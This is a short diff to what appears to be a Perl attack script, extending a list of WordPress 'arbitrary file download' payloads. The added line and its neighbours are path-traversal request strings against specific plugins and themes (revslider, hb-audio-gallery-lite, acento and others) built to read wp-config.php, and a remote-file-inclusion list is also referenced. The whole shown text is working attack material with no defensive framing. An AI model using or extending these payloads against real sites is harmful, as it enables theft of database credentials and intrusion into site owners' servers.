@@ -317,6 +317,7 @@ sub RFI {@RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator
 #ADF WP WORDPRESS
 sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
 "/wp-content/force-download.php?file=../wp-config.php",
+"/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10",
 "/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
 "/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
 "/wp-content/themes/markant/download.php?file=../../wp-config.php",
